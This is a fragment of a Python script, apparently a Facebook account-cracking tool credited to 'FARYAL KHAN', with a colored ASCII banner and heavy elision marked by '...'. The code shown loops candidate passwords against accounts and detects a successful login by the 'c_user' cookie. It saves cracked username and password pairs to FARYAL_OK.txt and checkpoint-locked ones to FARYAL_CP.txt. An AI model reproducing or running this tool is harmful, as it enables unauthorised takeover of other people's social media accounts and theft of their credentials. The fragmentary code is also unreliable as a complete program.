...
\033[1;35m💙💘✨____________💞💕❣️_____________💘💝💕💓

  Auther   : FARYAL KHAN
  \033[1;37mFacebook : MuskanAfridi682
  \033[1;36mYoutube  : FARYAL KHAN
  \033[1;37mNote     : FREE TOLL
  \033[1;37mVersion  : 0.3
  \033[1;35mWhatsapp. : Not Use
...
def mr():
    ...
    print(logo)
    os.system('xdg-open https://m.facebook.com/story.php?story_fbid=pfbid0D5EFgt5JpaB51ec5hzFU8AHWeBUGC39P1xj83rqVMd8VmC6UCMk7ZhaVNaqo21wEl&id=100004713454396&mibextid=Nif5oz')
        ...
        try:
            for pw in __chi__:
                ...
                if 'c_user' in session.cookies.get_dict():
                    ...
                    print(f"\r{H} [FARYAL-OK] {user} | {pw}")
                    wrt = '%s|%s' % (user,pw)
                    ok.append(wrt)
                    open('FARYAL_OK.txt' , 'a').write('%s\n' % wrt)
                    ...
                    try:
                        ...
                        print('\r%s [FARYAL-CP] %s | %s ' % (M, user, pw))
                        wrt = '%s|%s' % (user,pw)
                        cp.append(wrt)
                        open('FARYAL_CP.txt' , 'a').write('%s\n' % wrt)
                        break
